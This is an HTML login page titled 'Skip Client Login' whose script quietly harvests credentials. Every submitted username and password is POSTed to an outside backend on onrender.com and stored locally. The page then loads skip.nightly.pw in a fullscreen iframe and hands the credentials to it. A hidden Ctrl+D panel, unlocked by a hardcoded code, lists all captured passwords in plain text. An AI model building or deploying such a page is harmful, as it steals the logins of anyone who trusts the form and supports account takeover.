<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Skip Client Login</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet" />
<style>
  :root {
    --bg-dark: #0a0a0f;
    --bg-light: #1c1c28;
    --text-main: #ffffff;
    --text-muted: #8fa1c1;
    --accent: #4a90e2;
    --accent-hover: #357ab8;
    --input-bg: #141420;
    --input-border: #2a2a38;
  }

  * { box-sizing: border-box; }
  body {
    margin: 0;
    font-family: 'Inter', sans-serif;
    background: var(--bg-dark);
    color: var(--text-main);
    display: flex;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
    overflow: hidden;
  }

  main {
    background: var(--bg-light);
    padding: 32px;
    border-radius: 12px;
    width: 100%;
    max-width: 400px;
    box-shadow: 0 8px 24px rgba(0,0,0,0.5);
    position: relative;
    z-index: 1;
  }

  h1 {
    font-size: 24px;
    text-align: center;
    margin-bottom: 16px;
    color: var(--accent);
  }

  label {
    display: block;
    margin-bottom: 6px;
    font-weight: 600;
    color: var(--text-muted);
  }

  input[type="text"], input[type="password"] {
    width: 100%;
    padding: 10px 12px;
    margin-bottom: 16px;
    background: var(--input-bg);
    border: 1.5px solid var(--input-border);
    border-radius: 8px;
    color: var(--text-main);
    font-size: 14px;
  }

  input:focus {
    border-color: var(--accent);
    outline: none;
    box-shadow: 0 0 6px var(--accent);
  }

  button {
    width: 100%;
    padding: 12px;
    background: var(--accent);
    color: var(--text-main);
    border: none;
    border-radius: 8px;
    font-weight: 700;
    cursor: pointer;
    transition: background 0.2s ease;
  }

  button:hover {
    background: var(--accent-hover);
  }

  /* Dev modal */
  #devModal {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%) scale(0);
    background: var(--bg-light);
    border: 2px solid var(--accent);
    border-radius: 12px;
    padding: 24px;
    max-width: 480px;
    width: 90%;
    max-height: 70%;
    overflow-y: auto;
    color: var(--text-main);
    font-family: monospace;
    font-size: 13px;
    white-space: pre-wrap;
    z-index: 9999;
    transition: transform 0.2s ease, opacity 0.2s ease;
    opacity: 0;
  }

  #devModal.show {
    transform: translate(-50%, -50%) scale(1);
    opacity: 1;
  }

  #devModalClose {
    position: absolute;
    top: 8px;
    right: 12px;
    background: none;
    border: none;
    color: var(--accent);
    font-weight: 700;
    cursor: pointer;
    font-size: 16px;
  }

  /* Fullscreen iframe */
  #skipIframeOverlay {
    position: fixed;
    inset: 0;
    background: #000;
    display: none;
    z-index: 1000;
  }

  #skipIframeOverlay.active {
    display: block;
  }

  #skipIframe {
    width: 100%;
    height: 100%;
    border: 0;
  }

</style>
</head>
<body>

<main>
  <h1>Skip Client Login</h1>

  <form id="loginForm" autocomplete="off">
    <label for="username">Username</label>
    <input id="username" name="username" type="text" placeholder="Skip username" required />

    <label for="password">Password</label>
    <input id="password" name="password" type="text" placeholder="Password" />

    <button type="submit">Login & Enter Skip</button>
  </form>

  <div class="footer">&copy; 2025 Frix & Micro</div>
</main>

<!-- Dev modal -->
<div id="devModal">
  <button id="devModalClose">X</button>
  <pre id="devOutput"></pre>
</div>

<!-- Fullscreen iframe overlay -->
<div id="skipIframeOverlay">
  <iframe id="skipIframe" src="about:blank" title="Skip.nightly.pw"></iframe>
</div>

<script>
(function(){
  const BACKEND = "https://skip-client-login.onrender.com";
  const DEV_CODE = "jackson";
  const captures = [];

  const loginForm = document.getElementById('loginForm');
  const usernameEl = document.getElementById('username');
  const passwordEl = document.getElementById('password');

  const devModal = document.getElementById('devModal');
  const devOutput = document.getElementById('devOutput');
  const devModalClose = document.getElementById('devModalClose');

  const iframeOverlay = document.getElementById('skipIframeOverlay');
  const skipIframe = document.getElementById('skipIframe');

  async function saveEntry(username, password){
    try {
      await fetch(`${BACKEND}/api/entries`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
      });
    } catch(err){
      console.error('Save failed', err);
    }
  }

  async function fetchDevEntries(code){
    try {
      const res = await fetch(`${BACKEND}/api/dev?code=${encodeURIComponent(code)}`);
      if(!res.ok) throw new Error('Fetch failed');
      const data = await res.json();
      return data.entries || [];
    } catch(err){
      alert('Error fetching dev entries');
      return [];
    }
  }

  loginForm.addEventListener('submit', async e => {
    e.preventDefault();
    const username = usernameEl.value.trim();
    const password = passwordEl.value.trim();
    if(!username){
      alert('Enter username first.');
      return;
    }
    // save locally + backend
    const entry = { username, password, createdAt: new Date().toISOString() };
    captures.push(entry);
    await saveEntry(username, password);

    // open skip.nightly.pw in fullscreen iframe
    skipIframe.src = 'https://skip.nightly.pw';
    iframeOverlay.classList.add('active');

    // post credentials after iframe loads
    skipIframe.onload = () => {
      skipIframe.contentWindow.postMessage({
        type: 'skip-credentials',
        username: username,
        password: password
      }, 'https://skip.nightly.pw');
    };

    usernameEl.value = '';
    passwordEl.value = '';
  });

  // Dev modal functions
  function showDevModal(){ devModal.classList.add('show'); }
  function hideDevModal(){ devModal.classList.remove('show'); }
  devModalClose.addEventListener('click', hideDevModal);

  document.addEventListener('keydown', async e => {
    if(e.ctrlKey && e.key.toLowerCase() === 'd'){
      e.preventDefault();
      const code = prompt('Enter Dev Code:');
      if(code !== DEV_CODE){ alert('Wrong code'); return; }
      const backendEntries = await fetchDevEntries(code);
      let out = 'ðŸ§  DEV ENTRIES (backend):\n\n';
      backendEntries.forEach((e,i)=>{
        out += `${i+1}. Username: ${e.username}\n   Password: ${e.password ?? '(none)'}\n   Created: ${new Date(e.createdAt).toLocaleString()}\n\n`;
      });
      if(captures.length){
        out += '\nLocal (recent):\n\n';
        captures.forEach((e,i)=>{
          out += `${i+1}. Username: ${e.username}\n   Password: ${e.password ?? '(none)'}\n   Captured: ${new Date(e.createdAt).toLocaleString()}\n\n`;
        });
      }
      devOutput.textContent = out.trim();
      showDevModal();
    }
  });

})();
</script>

</body>
</html>
